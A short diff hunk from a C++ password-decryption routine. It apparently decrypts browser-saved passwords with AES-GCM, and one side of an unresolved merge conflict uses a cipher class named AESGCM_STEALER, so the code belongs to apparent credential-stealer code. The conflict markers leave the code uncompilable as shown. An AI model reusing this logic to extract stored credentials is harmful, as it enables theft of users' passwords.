@@ -71,11 +71,15 @@ std::string decrypt_password(std::string encrypted_pass, BYTE *key)
     {
         key_256[i] = key[i];
     }*/
+<<<<<<< HEAD
 
     if(encrypted_pass.length()<31){
         return "error";
     }
     auto cipher = new AESGCM(key);
+=======
+    auto cipher = new AESGCM_STEALER(key);
+>>>>>>> c24bc565337790c79505fd6309419d19be133cc2
     std::string iv_string = encrypted_pass.substr(3,12);
     std::vector<uint8_t> iv_vec(iv_string.begin(), iv_string.end());
     BYTE *iv = &iv_vec[0];
